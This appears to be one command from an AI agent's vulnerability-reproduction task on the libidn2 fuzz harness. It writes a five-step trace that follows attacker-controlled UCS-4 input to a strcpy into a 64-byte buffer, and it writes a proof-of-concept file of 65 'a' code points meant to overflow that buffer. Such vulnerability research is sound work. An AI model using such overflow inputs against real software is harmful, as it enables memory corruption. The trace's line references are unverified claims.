Command `cd /workspace/repo-vul/src-vul/libidn2 && python3 - <<'PY'
from pathlib import Path
# Create a candidate trace for the exact candidate we will submit next.
trace=[
  {"step":1,"file":"src-vul/libidn2/fuzz/libidn2_to_ascii_8z_fuzzer.c","function":"LLVMFuzzerTestOneInput","line":58,"var":"size/data","code":"if ((size & 3) == 0) { ... idn2_to_ascii_4i((uint32_t *) data, size / 4, out2, flags[it]); }","note":"The raw input is treated as an array of UCS-4 code points when its byte length is divisible by 4."},
  {"step":2,"file":"src-vul/libidn2/fuzz/libidn2_to_ascii_8z_fuzzer.c","function":"LLVMFuzzerTestOneInput","line":64,"var":"out2","code":"char *out2 = (char *) malloc(64);","note":"The destination buffer is fixed at 64 bytes, so any successful conversion producing more than 63 bytes will overflow it."},
  {"step":3,"file":"src-vul/libidn2/lib/lookup.c","function":"idn2_to_ascii_4i","line":581,"var":"input_u32","code":"input_u32 = (uint32_t *) malloc ((inlen + 1) * sizeof(uint32_t)); u32_cpy (input_u32, input, inlen);","note":"The attacker-controlled UCS-4 sequence is copied into a temporary buffer for conversion without reducing its length."},
  {"step":4,"file":"src-vul/libidn2/lib/lookup.c","function":"idn2_to_ascii_4i","line":596,"var":"output_u8","code":"rc = idn2_lookup_u8 (input_u8, &output_u8, flags);","note":"The copied UCS-4 data is converted to UTF-8 and passed into the lookup routine that generates the ASCII label."},
  {"step":5,"file":"src-vul/libidn2/lib/lookup.c","function":"label","line":618,"var":"output","code":"if (output) strcpy (output, (const char *) output_u8);","note":"The vulnerable sink copies the produced label into the caller buffer with strcpy and relies on the caller to have provided at least 63 bytes plus NUL."}
]
Path('/workspace/candidate_trace.json').write_text(__import__('json').dumps(trace,separators=(',',':')))
# 65 UCS-4 'a' code points => 260 bytes, chosen to maximize the chance of a >63-byte ASCII result.
bs=b''.join((0x61).to_bytes(4,'little') for _ in range(65))
Path('/workspace/repo-vul/src-vul/libidn2/poc_65a_u32le.bin').write_bytes(bs)
print('wrote trace and poc', len(bs))
PY
